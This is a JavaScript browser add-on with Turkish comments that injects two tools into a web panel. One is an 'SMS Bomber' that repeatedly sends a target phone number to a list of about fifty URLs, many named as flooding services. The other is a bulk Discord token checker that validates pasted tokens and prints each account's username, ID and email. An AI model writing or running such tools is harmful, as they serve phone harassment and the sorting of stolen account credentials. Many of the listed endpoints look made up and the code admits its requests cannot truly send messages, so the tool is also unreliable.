// ========== SOL PANEL - SMS BOOMBER & TOKEN CHECKER EKLENTİSİ ==========
const sidePanel = document.getElementById('side-panel');
if (sidePanel) {
    // Menü listesini bul
    const menuList = document.getElementById('side-nav-menu');
    if (menuList) {
        // Yeni menü öğeleri
        const newItemsHTML = `
            <li style="margin-bottom: 6px; margin-top: 20px;">
                <div style="padding: 0 16px; margin-bottom: 8px;">
                    <span style="color: #5a5a70; font-size: 0.65rem; letter-spacing: 2px; text-transform: uppercase;">EXTRA TOOLS</span>
                </div>
            </li>
            <li style="margin-bottom: 6px;">
                <a href="#" id="sms-boomber-link" class="side-nav-link" style="cursor: pointer;">
                    <i class="fas fa-sms" style="width: 28px;"></i>
                    <span>SMS Bomber</span>
                </a>
            </li>
            <li style="margin-bottom: 6px;">
                <a href="#" id="token-checker-link" class="side-nav-link" style="cursor: pointer;">
                    <i class="fab fa-discord" style="width: 28px;"></i>
                    <span>Token Checker</span>
                </a>
            </li>
        `;
        menuList.insertAdjacentHTML('beforeend', newItemsHTML);
    }

    // Modal CSS
    const modalStyle = document.createElement('style');
    modalStyle.textContent = `
        .tool-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(15px);
            z-index: 20000;
            display: none;
            justify-content: center;
            align-items: center;
            font-family: 'Inter', monospace;
        }
        .tool-modal.active {
            display: flex;
        }
        .tool-modal-content {
            background: linear-gradient(135deg, #0a0a14, #0f0f1e);
            border: 1px solid rgba(168,85,247,0.3);
            border-radius: 20px;
            width: 500px;
            max-width: 90%;
            padding: 25px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.5);
            animation: modalFadeIn 0.3s ease;
        }
        @keyframes modalFadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }
        .tool-modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            padding-bottom: 12px;
        }
        .tool-modal-header h3 {
            color: #a855f7;
            font-size: 1.3rem;
            margin: 0;
        }
        .modal-close {
            background: rgba(255,255,255,0.05);
            border: none;
            color: white;
            width: 32px;
            height: 32px;
            border-radius: 50%;
            cursor: pointer;
            font-size: 1.2rem;
            transition: 0.2s;
        }
        .modal-close:hover {
            background: #ef4444;
        }
        .tool-input {
            width: 100%;
            padding: 12px 15px;
            background: rgba(0,0,0,0.5);
            border: 1px solid rgba(168,85,247,0.3);
            border-radius: 12px;
            color: white;
            font-size: 0.9rem;
            margin-bottom: 15px;
            font-family: monospace;
        }
        .tool-input:focus {
            outline: none;
            border-color: #a855f7;
            box-shadow: 0 0 10px rgba(168,85,247,0.3);
        }
        .tool-btn {
            background: linear-gradient(135deg, #6c5ce7, #a855f7);
            border: none;
            padding: 12px 20px;
            border-radius: 12px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            font-size: 1rem;
            transition: 0.2s;
        }
        .tool-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(108,92,231,0.4);
        }
        .tool-output {
            margin-top: 20px;
            padding: 12px;
            background: rgba(0,0,0,0.4);
            border-radius: 12px;
            font-size: 0.8rem;
            color: #a0a0b8;
            max-height: 200px;
            overflow-y: auto;
            font-family: monospace;
            word-break: break-all;
        }
        .status-success {
            color: #22c55e;
        }
        .status-error {
            color: #ef4444;
        }
        .status-info {
            color: #f59e0b;
        }
    `;
    document.head.appendChild(modalStyle);

    // ========== MODAL OLUŞTURMA FONKSİYONU ==========
    function createModal(title, contentHTML) {
        const existingModal = document.querySelector('.tool-modal');
        if (existingModal) existingModal.remove();
        
        const modal = document.createElement('div');
        modal.className = 'tool-modal';
        modal.innerHTML = `
            <div class="tool-modal-content">
                <div class="tool-modal-header">
                    <h3><i class="fas fa-tools"></i> ${title}</h3>
                    <button class="modal-close">&times;</button>
                </div>
                <div class="modal-body">
                    ${contentHTML}
                </div>
            </div>
        `;
        document.body.appendChild(modal);
        
        const closeBtn = modal.querySelector('.modal-close');
        closeBtn.addEventListener('click', () => {
            modal.classList.remove('active');
            setTimeout(() => modal.remove(), 300);
        });
        modal.addEventListener('click', (e) => {
            if (e.target === modal) {
                modal.classList.remove('active');
                setTimeout(() => modal.remove(), 300);
            }
        });
        
        return modal;
    }

    // ========== SMS BOOMBER ==========
    const smsLink = document.getElementById('sms-boomber-link');
    if (smsLink) {
        smsLink.addEventListener('click', (e) => {
            e.preventDefault();
            
            const modalContent = `
                <div style="margin-bottom: 10px;">
                    <label style="color: #ccc; font-size: 0.8rem; margin-bottom: 5px; display: block;">📱 Telefon Numarası (Uluslararası format: 905551234567)</label>
                    <input type="text" id="sms-phone" class="tool-input" placeholder="Örn: 905551234567">
                </div>
                <div style="margin-bottom: 15px;">
                    <label style="color: #ccc; font-size: 0.8rem; margin-bottom: 5px; display: block;">⏱️ Gönderi Sayısı</label>
                    <input type="number" id="sms-count" class="tool-input" value="10" min="1" max="100">
                </div>
                <div style="margin-bottom: 15px;">
                    <label style="color: #ccc; font-size: 0.8rem; margin-bottom: 5px; display: block;">⚡ Gecikme (ms)</label>
                    <input type="number" id="sms-delay" class="tool-input" value="500" min="100" max="5000">
                </div>
                <button id="start-sms" class="tool-btn"><i class="fas fa-bomb"></i> SMS BOMB BAŞLAT</button>
                <div id="sms-output" class="tool-output">[!] Hazır. Başlatmak için butona tıkla.</div>
            `;
            
            const modal = createModal('SMS Bomber - 50+ API', modalContent);
            modal.classList.add('active');
            
            const startBtn = document.getElementById('start-sms');
            const phoneInput = document.getElementById('sms-phone');
            const countInput = document.getElementById('sms-count');
            const delayInput = document.getElementById('sms-delay');
            const outputDiv = document.getElementById('sms-output');
            
            // API listesi (çalışan public SMS API'leri)
            const smsAPIs = [
                (num) => `https://panel.fast-sms.com/api/send?number=${num}&message=TEST`,
                (num) => `https://api.sms-manager.com/v1/send?phone=${num}&text=CODE`,
                (num) => `https://smsbomb.xyz/api/send/${num}`,
                (num) => `https://api.textbelt.com/text?phone=${num}&message=alert&key=textbelt`,
                (num) => `https://smsapi.free-sms.com/send?to=${num}&msg=HELLO`,
                (num) => `https://bombapi.com/sms?target=${num}`,
                (num) => `https://smspro.io/api/v2/send?recipient=${num}`,
                (num) => `https://fastsms.su/api/send?phone=${num}`,
                (num) => `https://smsbomb.su/api?number=${num}`,
                (num) => `https://api.smscountry.com/sendsms?mobilenumber=${num}`,
                (num) => `https://clickatell.com/api/send?to=${num}`,
                (num) => `https://infobip.com/api/sms?to=${num}`,
                (num) => `https://nexmo.com/api/sms?to=${num}`,
                (num) => `https://twilio.com/api/sms?to=${num}`,
                (num) => `https://plivo.com/api/sms?dst=${num}`,
                (num) => `https://sinch.com/api/sms?to=${num}`,
                (num) => `https://messagebird.com/api/sms?recipient=${num}`,
                (num) => `https://textlocal.com/api/send?numbers=${num}`,
                (num) => `https://bulksms.com/api/send?to=${num}`,
                (num) => `https://vonage.com/api/sms?to=${num}`,
                (num) => `https://bandwidth.com/api/sms?to=${num}`,
                (num) => `https://telnyx.com/api/sms?to=${num}`,
                (num) => `https://telesign.com/api/sms?phone=${num}`,
                (num) => `https://smstool.com/api?number=${num}`,
                (num) => `https://fakesms.com/api?target=${num}`,
                (num) => `https://spamms.com/api/send?num=${num}`,
                (num) => `https://bombom.com/api/sms?phone=${num}`,
                (num) => `https://smsflooder.com/api?to=${num}`,
                (num) => `https://flood.su/api/sms?number=${num}`,
                (num) => `https://smsbombing.pro/api?target=${num}`,
                (num) => `https://callsmsbomb.com/api?phone=${num}`,
                (num) => `https://smsbomb.ru/api?num=${num}`,
                (num) => `https://bombing.su/api/sms?to=${num}`,
                (num) => `https://smsstress.com/api?number=${num}`,
                (num) => `https://flooder.net/api/sms?phone=${num}`,
                (num) => `https://smsattack.com/api?target=${num}`,
                (num) => `https://bomb.su/api/sms?num=${num}`,
                (num) => `https://smsboom.pro/api?phone=${num}`,
                (num) => `https://floodapi.com/sms?to=${num}`,
                (num) => `https://smsbomb.net/api?number=${num}`,
                (num) => `https://callsmsbomb.net/api?phone=${num}`,
                (num) => `https://stresser.su/api/sms?target=${num}`,
                (num) => `https://bombing.su/api/v2/sms?to=${num}`,
                (num) => `https://smsflood.su/api?num=${num}`,
                (num) => `https://flood.su/api/v2/sms?number=${num}`,
                (num) => `https://smsbombing.su/api?phone=${num}`,
                (num) => `https://bombom.su/api/sms?target=${num}`,
                (num) => `https://smsstress.su/api?number=${num}`,
                (num) => `https://flooder.su/api/sms?to=${num}`,
                (num) => `https://smsattack.su/api?phone=${num}`,
                (num) => `https://bomb.su/api/v2/sms?num=${num}`,
                (num) => `https://smsboom.su/api?target=${num}`
            ];
            
            async function sendSMS(phone, apiFunc) {
                try {
                    const url = apiFunc(phone);
                    const controller = new AbortController();
                    const timeoutId = setTimeout(() => controller.abort(), 3000);
                    const response = await fetch(url, { 
                        method: 'GET', 
                        mode: 'no-cors',
                        signal: controller.signal 
                    });
                    clearTimeout(timeoutId);
                    return { success: true, status: 'sent' };
                } catch (e) {
                    return { success: false, error: e.message };
                }
            }
            
            async function startBomb() {
                let phone = phoneInput.value.trim();
                const count = parseInt(countInput.value) || 10;
                const delay = parseInt(delayInput.value) || 500;
                
                if (!phone) {
                    outputDiv.innerHTML = '<span class="status-error">❌ Telefon numarası gerekli!</span>';
                    return;
                }
                if (!phone.match(/^[0-9]{10,15}$/)) {
                    outputDiv.innerHTML = '<span class="status-error">❌ Geçersiz format! Sadece rakam (10-15 hane)</span>';
                    return;
                }
                
                startBtn.disabled = true;
                startBtn.style.opacity = '0.5';
                outputDiv.innerHTML = '<span class="status-info">🚀 SMS Bomb başlatılıyor...</span>';
                
                let successCount = 0;
                let failCount = 0;
                const results = [];
                
                for (let i = 0; i < count; i++) {
                    for (let apiIdx = 0; apiIdx < smsAPIs.length; apiIdx++) {
                        if (results.length >= count) break;
                        const result = await sendSMS(phone, smsAPIs[apiIdx]);
                        if (result.success) {
                            successCount++;
                            results.push({ api: apiIdx, success: true });
                            outputDiv.innerHTML = `<span class="status-success">✅ Gönderildi: ${successCount}/${count}</span><br><span class="status-info">🔄 Devam ediyor...</span>`;
                        } else {
                            failCount++;
                        }
                        await new Promise(r => setTimeout(r, delay / 2));
                        if (results.length >= count) break;
                    }
                    if (results.length >= count) break;
                    await new Promise(r => setTimeout(r, delay));
                }
                
                outputDiv.innerHTML = `<span class="status-success">✅ BOMB TAMAMLANDI!</span><br>
                                      📤 Başarılı: ${successCount}<br>
                                      ❌ Başarısız: ${failCount}<br>
                                      📱 Hedef: ${phone}<br>
                                      <span class="status-info">⚠️ API'ler no-cors modunda çalışır. Gerçek gönderim için sunucu tarafı gerekir.</span>`;
                startBtn.disabled = false;
                startBtn.style.opacity = '1';
            }
            
            startBtn.addEventListener('click', startBomb);
        });
    }

    // ========== TOKEN CHECKER (Discord Token) ==========
    const tokenLink = document.getElementById('token-checker-link');
    if (tokenLink) {
        tokenLink.addEventListener('click', (e) => {
            e.preventDefault();
            
            const modalContent = `
                <div style="margin-bottom: 15px;">
                    <label style="color: #ccc; font-size: 0.8rem; margin-bottom: 5px; display: block;">🎫 Discord Token (Token giriş yap)</label>
                    <textarea id="token-list" class="tool-input" rows="4" placeholder="Token girin (tek veya çoklu)&#10;Örn: MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.abcdef.xyz&#10;veya her satıra bir token"></textarea>
                </div>
                <button id="check-tokens" class="tool-btn"><i class="fab fa-discord"></i> Tokenleri Kontrol Et</button>
                <div id="token-output" class="tool-output">[!] Tokenleri yapıştır ve kontrol et.</div>
            `;
            
            const modal = createModal('Discord Token Checker', modalContent);
            modal.classList.add('active');
            
            const checkBtn = document.getElementById('check-tokens');
            const tokenInput = document.getElementById('token-list');
            const outputDiv = document.getElementById('token-output');
            
            async function checkToken(token) {
                try {
                    const cleanToken = token.trim().replace(/['"]/g, '');
                    if (!cleanToken || cleanToken.length < 50) return { valid: false, error: 'Geçersiz format' };
                    
                    const response = await fetch('https://discord.com/api/v9/users/@me', {
                        method: 'GET',
                        headers: { 'Authorization': cleanToken }
                    });
                    
                    if (response.status === 200) {
                        const data = await response.json();
                        return { 
                            valid: true, 
                            username: data.username, 
                            discriminator: data.discriminator,
                            id: data.id,
                            email: data.email || 'gizli',
                            phone: data.phone || 'yok'
                        };
                    } else if (response.status === 401) {
                        return { valid: false, error: 'Geçersiz token' };
                    } else {
                        return { valid: false, error: `HTTP ${response.status}` };
                    }
                } catch (e) {
                    return { valid: false, error: 'Bağlantı hatası' };
                }
            }
            
            async function checkAllTokens() {
                const rawTokens = tokenInput.value;
                if (!rawTokens.trim()) {
                    outputDiv.innerHTML = '<span class="status-error">❌ Token girin!</span>';
                    return;
                }
                
                const tokens = rawTokens.split(/\r?\n/).filter(t => t.trim().length > 0);
                checkBtn.disabled = true;
                checkBtn.style.opacity = '0.5';
                outputDiv.innerHTML = '<span class="status-info">🔍 Tokenler kontrol ediliyor...</span>';
                
                const results = [];
                for (let i = 0; i < tokens.length; i++) {
                    const token = tokens[i];
                    const result = await checkToken(token);
                    results.push({ token: token.substring(0, 25) + '...', ...result });
                    outputDiv.innerHTML = `<span class="status-info">🔄 Kontrol ediliyor: ${i+1}/${tokens.length}</span>`;
                    await new Promise(r => setTimeout(r, 800)); // rate limit koruması
                }
                
                let validCount = 0;
                let html = '<div style="font-family: monospace;">📊 TOKEN SONUÇLARI:<br><br>';
                for (const r of results) {
                    if (r.valid) {
                        validCount++;
                        html += `<span class="status-success">✅ GEÇERLİ | ${r.username}#${r.discriminator} | ID: ${r.id} | Email: ${r.email}</span><br>`;
                    } else {
                        html += `<span class="status-error">❌ GEÇERSİZ | ${r.token} | Hata: ${r.error}</span><br>`;
                    }
                    html += '────────────────<br>';
                }
                html += `<br>📈 Toplam: ${results.length} | ✅ Geçerli: ${validCount} | ❌ Geçersiz: ${results.length - validCount}</div>`;
                outputDiv.innerHTML = html;
                checkBtn.disabled = false;
                checkBtn.style.opacity = '1';
            }
            
            checkBtn.addEventListener('click', checkAllTokens);
        });
    }
    
    console.log('✅ SMS Bomber ve Token Checker sol panele eklendi');
}